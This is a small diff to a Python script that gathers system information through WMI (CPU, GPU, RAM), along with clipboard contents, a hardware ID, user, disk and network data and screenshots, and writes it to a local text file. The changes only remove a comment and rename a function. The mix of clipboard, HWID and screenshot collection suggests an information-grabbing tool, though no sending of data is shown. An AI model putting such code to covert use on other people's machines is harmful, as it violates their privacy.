@@ -31,7 +31,7 @@ def system():
     
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
-    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize#round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
     return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}"
@@ -74,7 +74,7 @@ def screenshot():
         pass
 
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
-def save():
+def start():
     try:
         with open("system.txt", "w",encoding="utf-8") as f:
             f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
